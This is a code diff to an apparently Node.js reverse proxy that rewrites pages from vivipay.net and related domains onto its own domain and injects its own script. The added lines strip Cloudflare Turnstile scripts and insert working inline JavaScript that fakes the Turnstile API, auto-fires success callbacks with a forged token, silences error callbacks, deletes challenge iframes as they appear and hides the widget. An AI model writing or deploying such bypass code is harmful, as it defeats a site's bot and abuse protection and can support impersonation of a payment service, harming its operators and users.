@@ -1769,6 +1769,9 @@ app.all('*', async (req, res) => {
       html = html.replace(/https:\/\/tivox\.icu/g, proxyBase);
       html = html.replace(/https:\/\/qonix\.click/g, proxyBase);
 
+      // ── Strip Cloudflare Turnstile scripts (they fail on proxy domain) ──
+      html = html.replace(/<script[^>]*src="[^"]*challenges\.cloudflare\.com[^"]*"[^>]*>\s*<\/script>/gi, '');
+
       // Rewrite JS script src tags to go through OUR proxy so we can patch them
       // CSS/fonts/images keep base href pointing to vivipay.net (fast direct load)
       html = html.replace(
@@ -1781,20 +1784,55 @@ app.all('*', async (req, res) => {
         `$1${proxyBase}/$3$4`
       );
 
+      // ── Inline Turnstile bypass — MUST run before any other script ──
+      // Mocks window.turnstile, auto-fires callback, blocks CF scripts/iframes from DOM
+      const turnstileBypass = '<script>'
+        + '(function(){'
+        + 'var T="bp_"+Date.now();'
+        + 'var M={render:function(e,o){if(o&&typeof o.callback==="function")setTimeout(function(){try{o.callback(T)}catch(x){}},5);return"w_"+Math.random().toString(36).slice(2)},remove:function(){},reset:function(){},getResponse:function(){return T},isExpired:function(){return false}};'
+        + 'var _r=null;'
+        + 'try{Object.defineProperty(window,"turnstile",{configurable:true,'
+        + 'get:function(){return _r||M},'
+        + 'set:function(v){'
+        + 'if(v&&typeof v==="object"&&typeof v.render==="function"){'
+        + '_r={};for(var k in v)_r[k]=v[k];'
+        + '_r.render=function(el,opts){'
+        + 'if(opts){opts["error-callback"]=function(){};opts["expired-callback"]=function(){};opts["timeout-callback"]=function(){};opts["unsupported-callback"]=function(){}}'
+        + 'var cb=opts&&opts.callback;if(cb)setTimeout(function(){try{cb(T)}catch(e){}},10);'
+        + 'return"w_"+Math.random().toString(36).slice(2)};'
+        + '_r.getResponse=function(){return T};_r.isExpired=function(){return false};_r.remove=function(){};_r.reset=function(){}'
+        + '}else{_r=M}'
+        + '}})}catch(e){window.turnstile=M}'
+        + 'try{var _oCb;Object.defineProperty(window,"onloadTurnstileCallback",{configurable:true,'
+        + 'get:function(){return _oCb},'
+        + 'set:function(fn){_oCb=fn;if(typeof fn==="function")setTimeout(function(){try{fn()}catch(e){}},50)}'
+        + '})}catch(e){}'
+        + 'function wb(){if(!document.body)return;new MutationObserver(function(ms){ms.forEach(function(m){m.addedNodes.forEach(function(n){if(n.nodeType!==1)return;if((n.tagName==="IFRAME"||n.tagName==="SCRIPT")&&n.src&&n.src.indexOf("challenges.cloudflare.com")>-1)n.remove()})})}).observe(document.body,{childList:true,subtree:true})}'
+        + 'if(document.body)wb();else document.addEventListener("DOMContentLoaded",wb)'
+        + '})()'
+        + '</script>';
+
+      // Preconnect hints for faster asset loading from vivipay.net
+      const preconnect = `<link rel="preconnect" href="${frontendBase}" crossorigin><link rel="dns-prefetch" href="${frontendBase}">`;
+
+      // CSS to hide Turnstile widget container (prevent "Verifying..." flash)
+      const turnstileCSS = '<style>.cf-turnstile,[data-sitekey]{display:none!important;height:0!important;overflow:hidden!important}</style>';
+
       // Add <base> tag so remaining relative asset URLs (CSS, images, fonts) load directly from vivipay.net
       const baseTag = `<base href="${frontendBase}/">`;
 
-      // Inject base tag + inject.js before </head>
+      // Inject: turnstile bypass FIRST in <head> (runs before everything), base+inject.js before </head>
       const injectTag = `<script src="${proxyBase}/inject.js"></script>`;
       if (html.includes('</head>')) {
+        html = html.replace(/<head[^>]*>/i, '$&\n' + turnstileBypass + '\n' + turnstileCSS + '\n' + preconnect);
         html = html.replace('</head>', baseTag + '\n' + injectTag + '\n</head>');
       } else {
-        html = baseTag + '\n' + injectTag + '\n' + html;
+        html = turnstileBypass + '\n' + turnstileCSS + '\n' + preconnect + '\n' + baseTag + '\n' + injectTag + '\n' + html;
       }
 
       const buf = Buffer.from(html, 'utf-8');
       // Cache HTML server-side for 30s — avoids vivipay.net round-trip on each refresh
-      cacheSet(htmlCacheKey, buf, 'text/html; charset=utf-8', response.status, 30000);
+      cacheSet(htmlCacheKey, buf, 'text/html; charset=utf-8', response.status, 60000);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
       res.setHeader('Pragma', 'no-cache');
       res.setHeader('content-type', 'text/html; charset=utf-8');
